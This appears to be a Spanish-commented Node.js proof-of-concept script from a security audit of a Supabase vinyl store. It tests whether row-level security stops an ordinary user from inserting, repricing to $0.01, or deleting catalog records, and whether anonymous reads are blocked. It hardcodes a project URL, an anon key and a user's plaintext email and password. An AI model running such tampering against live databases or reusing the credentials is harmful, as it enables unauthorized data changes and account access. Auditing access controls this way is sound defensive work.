/**
 * PoC — VUL-07: UPDATE sin WITH CHECK + Broken Access Control General
 * Proyecto: VynilStore (Groovehaus)
 * Auditor: Manuel
 * 
 * OBJETIVO: Probar operaciones CRUD en `vinyls` con un usuario normal
 * para confirmar que las RLS bloquean correctamente.
 * Adicionalmente prueba el gap de WITH CHECK en UPDATE.
 * 
 * USO:
 *   node poc_vul07_rls_vinyls.js
 */

import { createClient } from '@supabase/supabase-js'

const SUPABASE_URL  = 'https://ybcxzntioiohbmyhwiee.supabase.co'
const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InliY3h6bnRpb2lvaGJteWh3aWVlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNDI2MTksImV4cCI6MjA5NDgxODYxOX0.slRr5A5K804uag2N-1g6u9jz2Vaq2FXB1mRoxQXE37k'

// Usuario NORMAL (no admin)
const USER_EMAIL    = 'manualcraft@gmail.com'
const USER_PASSWORD = 'manuelito'

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON)

function result(label, isVulnerable, detail = '') {
  console.log(`   ${isVulnerable ? '🔴 VULNERABLE' : '✅ SEGURO'} — ${label}`)
  if (detail) console.log(`   → ${detail}`)
}

async function runPoC() {
  console.log('='.repeat(60))
  console.log('PoC VUL-07 — Broken Access Control en tabla vinyls')
  console.log('='.repeat(60))

  // Login como usuario normal
  const { data: loginData, error: loginErr } = await supabase.auth.signInWithPassword({
    email: USER_EMAIL, password: USER_PASSWORD
  })
  if (loginErr) { console.error('❌ Login fallido:', loginErr.message); process.exit(1) }
  console.log(`\n✅ Logueado como usuario NORMAL: ${loginData.user.email}`)

  // TEST A: SELECT (debería funcionar para usuarios autenticados)
  console.log('\n[TEST A] Usuario normal hace SELECT en vinyls:')
  const { data: selectData, error: selectErr } = await supabase
    .from('vinyls').select('id, title').limit(3)
  
  if (selectErr) {
    result('No puede leer vinyls', false, selectErr.message + ' (¿demasiado restrictivo?)')
  } else {
    result('Puede leer vinyls', false, `Devolvió ${selectData.length} registros ✅ (correcto por diseño)`)
  }

  // Necesitamos un ID de vinyl para las siguientes pruebas
  const targetId = selectData?.[0]?.id
  if (!targetId) { console.log('   ⚠️  Sin vinyls en DB para continuar tests'); process.exit(0) }
  console.log(`   Usando vinyl ID: ${targetId}`)

  // TEST B: INSERT (debe ser bloqueado — solo admins)
  console.log('\n[TEST B] Usuario normal intenta INSERT en vinyls:')
  const { data: insertData, error: insertErr } = await supabase
    .from('vinyls')
    .insert([{ title: 'HACK TEST', artist: 'Audit', price: 1, year: 2026, type: 'LP' }])
    .select('id')

  if (insertErr) {
    result('INSERT bloqueado por RLS', false, insertErr.message)
  } else {
    result('¡INSERT exitoso como usuario normal!', true,
      `Vinyl creado con ID: ${insertData[0].id}`)
    // Intentar limpiar
    await supabase.from('vinyls').delete().eq('id', insertData[0].id)
  }

  // TEST C: UPDATE de precio (debe ser bloqueado — solo admins)
  console.log('\n[TEST C] Usuario normal intenta UPDATE de precio:')
  const { data: updateData, error: updateErr } = await supabase
    .from('vinyls')
    .update({ price: 0.01 })  // Precio 1 centavo — ataque de precio
    .eq('id', targetId)
    .select('id, price')

  if (updateErr) {
    result('UPDATE bloqueado por RLS', false, updateErr.message)
  } else if (updateData && updateData.length > 0) {
    result('¡UPDATE exitoso como usuario normal!', true,
      `Precio cambiado a: $${updateData[0].price} en ID: ${targetId}`)
    console.log('   🚨 Un usuario podría cambiar precios a $0.01')
  } else {
    result('UPDATE rechazado (0 filas afectadas)', false, 'RLS funcionando correctamente')
  }

  // TEST D: DELETE (debe ser bloqueado — solo admins)
  console.log('\n[TEST D] Usuario normal intenta DELETE:')
  const { data: deleteData, error: deleteErr } = await supabase
    .from('vinyls')
    .delete()
    .eq('id', targetId)
    .select('id')

  if (deleteErr) {
    result('DELETE bloqueado por RLS', false, deleteErr.message)
  } else if (deleteData && deleteData.length > 0) {
    result('¡DELETE exitoso como usuario normal!', true,
      `Vinyl ${targetId} eliminado del catálogo`)
  } else {
    result('DELETE rechazado (0 filas afectadas)', false, 'RLS funcionando correctamente')
  }

  // TEST E: Sin autenticación (anon)
  console.log('\n[TEST E] Request SIN JWT (usuario anónimo):')
  await supabase.auth.signOut()
  
  const { data: anonSelect, error: anonErr } = await supabase
    .from('vinyls').select('id, title').limit(3)

  if (anonErr) {
    result('Anon bloqueado de leer vinyls', false, anonErr.message)
  } else if (anonSelect && anonSelect.length > 0) {
    result('¡Anon puede leer vinyls!', true,
      `Devolvió ${anonSelect.length} registros sin JWT`)
  } else {
    result('Anon obtiene 0 resultados', false, 'RLS correctamente requiere autenticación')
  }

  console.log('\n' + '='.repeat(60))
  console.log('FIN DEL TEST DE BROKEN ACCESS CONTROL EN VINYLS')
  console.log('='.repeat(60))
}

runPoC().catch(console.error)
